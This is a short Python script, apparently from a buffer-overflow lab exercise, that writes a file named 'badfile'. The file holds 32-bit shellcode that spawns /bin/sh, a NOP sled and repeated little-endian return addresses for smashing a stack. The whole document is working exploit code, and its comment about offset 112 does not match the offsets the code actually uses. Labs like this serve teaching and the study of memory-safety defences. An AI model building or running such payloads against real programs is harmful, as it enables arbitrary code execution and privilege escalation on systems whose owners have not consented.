import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(862)) 
# Put the shellcode at the end 
content[401:401+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffcf4e + 100 
for i in range(810,862, 4):
    content[i:i+4] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

